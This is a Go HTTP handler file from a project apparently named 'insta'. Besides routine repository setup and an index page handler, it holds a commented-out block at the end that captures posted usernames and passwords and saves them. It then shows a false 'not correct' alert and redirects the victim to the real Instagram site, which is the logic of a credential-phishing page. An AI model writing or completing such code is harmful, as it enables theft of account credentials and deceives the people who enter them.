package handler

import (
	"insta/pkg/config"
	"insta/pkg/render"
	"net/http"
)

// Repository is the repository type
type Repository struct {
	App *config.AppConfig
}

func NewRepo(a *config.AppConfig) *Repository {
	return &Repository{
		App: a,
	}
}

// Repo the repository used by the handlers
var Repo *Repository

// NewHandlers sets the repository for the handlers
func NewHandlers(r *Repository) {
	Repo = r
}

func (m *Repository) Index(w http.ResponseWriter, r *http.Request) {
	render.RenderTemplate(w, "index.html")
}

//r.ParseForm()
//username := r.PostFormValue("u_name")
//password := r.PostFormValue("pass")
//
//if len(username) >= 2 && len(password) > 7 {
//	save.SaveCredentials(username, password)
//	dialog.Alert("username and password is not correct !!!")
//	http.Redirect(w, r, "https://www.instagram.com", http.StatusSeeOther)
//} else {
//	fmt.Println("Please enter correct username or password. Try again")
//	http.Redirect(w, r, "/", http.StatusSeeOther)
//}
